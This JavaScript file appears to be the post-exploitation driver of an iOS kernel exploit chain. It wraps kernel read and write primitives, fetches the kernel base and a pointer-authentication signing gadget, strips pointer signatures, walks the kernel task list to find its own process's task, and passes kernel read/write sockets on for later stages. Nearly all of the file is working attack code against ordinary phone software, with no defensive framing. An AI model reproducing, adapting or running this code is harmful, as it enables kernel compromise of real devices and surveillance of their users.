import Offsets from "./Offsets";
import Native from "libs/Chain/Native";
import Utils from "libs/JSUtils/Utils";

const TAG = "DRIVER-POSTEXPL"

export default class DriverPostExpl
{
	#offsets;
	#kernelBase;

	constructor() {
		this.#offsets = Offsets.getByDeviceAndVersion();
	}

	runPE() {
		console.log(TAG, `runPE()`);
		if (!this.#offsets) {
			console.log(TAG, `Offsets were not obtained, aborting`);
			return false;
		}
		/*
		let baseKernel = startSandworm();
		if (baseKernel == -1)
			return false;
		*/
		this.#kernelBase = mpd_kernel_base();

		return true;
	}

	getPaciaGadget() {
		return mpd_pacia_gadget();
	}

	getKernelBase() {
		return this.#kernelBase;
	}

	getSelfTaskAddr() {
		console.log(TAG, `getSelfTaskAddr`);

		let selfTaskKaddr = 0;
		for (let i=0; i<5; i++)
		{
			selfTaskKaddr = this.#findSelfTaskKaddr(true);
			if (!selfTaskKaddr)
			{
				console.log(TAG, `Searching the other way around`);
				selfTaskKaddr = this.#findSelfTaskKaddr(false);
			}
			else
				break;
			Native.callSymbol("usleep",20000);
		}
		return selfTaskKaddr;
	}

	#findSelfTaskKaddr(direction) {
		let kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;
		console.log(TAG, `baseKernel: ${Utils.hex(this.#kernelBase)}, kernelTask: ${Utils.hex(kernelTaskAddr)}`);

		let kernelTaskVal = Native.mem;
		this.read(kernelTaskAddr, kernelTaskVal, Utils.UINT64_SIZE);
		kernelTaskVal = uread64(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${kernelTaskVal}`);
		kernelTaskVal = BigInt(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);
		let ourPid = Native.callSymbol("getpid");
		console.log(TAG, `Our pid:${ourPid}`);
		let nextTask = Native.mem + 0x100n;
		if (direction)
			this.read(kernelTaskVal + this.#offsets.nextTask, nextTask, Utils.UINT64_SIZE);
		else
			this.read(kernelTaskVal + this.#offsets.prevTask, nextTask, Utils.UINT64_SIZE);
		nextTask = uread64(nextTask);
		//console.log(TAG,`nextTask:${Utils.hex(nextTask)}`);

		while (nextTask != 0 && nextTask != kernelTaskVal) {
			let procROAddr = Native.mem;
			this.read(nextTask + this.#offsets.procRO, procROAddr, Utils.UINT64_SIZE);
			procROAddr = uread64(procROAddr);
			//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);
			let procVal = Native.mem;
			this.read(procROAddr, procVal, 8);
			procVal = BigInt(uread64(procVal));
			//console.log(TAG,`procVal:${Utils.hex(procVal)}`);
			if (procVal && this.strip(procVal) > 0xffffffd000000000n) {
				let pid = Native.mem;
				this.read(procVal + this.#offsets.pid, pid, Utils.UINT64_SIZE);
				let buffRes = Native.read(pid, 4);
				let view = new DataView(buffRes);
				pid = view.getUint32(0,true);
				//console.log(TAG,`pid:${Utils.hex(pid)}`);
				if (pid == ourPid) {
					console.log(TAG, `Found our pid`);
					return nextTask;
				}
				let nextTaskLocation = Native.mem;
				if (direction)
					this.read(nextTask + this.#offsets.nextTask, nextTaskLocation, Utils.UINT64_SIZE);
				else
					this.read(nextTask + this.#offsets.prevTask, nextTaskLocation, Utils.UINT64_SIZE);
				nextTask = uread64(nextTaskLocation);
			}
			else
				break;
		}
		return false;
	}

	read(srcAddr, dst, len) {
		srcAddr = this.strip(srcAddr);
		if (srcAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot read: ${Utils.hex(srcAddr)}`);
			return false;
		}
		kread_length(srcAddr,dst, len);
		return true;
	}

	write(dst, src, len) {
		let dstAddr = this.strip(dst);
		if (dstAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot write:${Utils.hex(dstAddr)}`);
			return false;
		}
		kwrite_length(dst, src, len);
		return true;
	}

	writeZoneElement(dstAddr, src, len) {
		return kwrite_zone_element(dstAddr, src, len);
	}

	offsets() {
		return this.#offsets;
	}

	strip(val) {
		return xpac(val);
	}

	transferRW() {
		return {
			controlSocket: mpd_control_socket(),
			rwSocket: mpd_rw_socket()
		};
	}

	threadSpawn(scriptCFString, threadMem) {
		mpd_js_thread_spawn(scriptCFString, threadMem, true);
	}
}
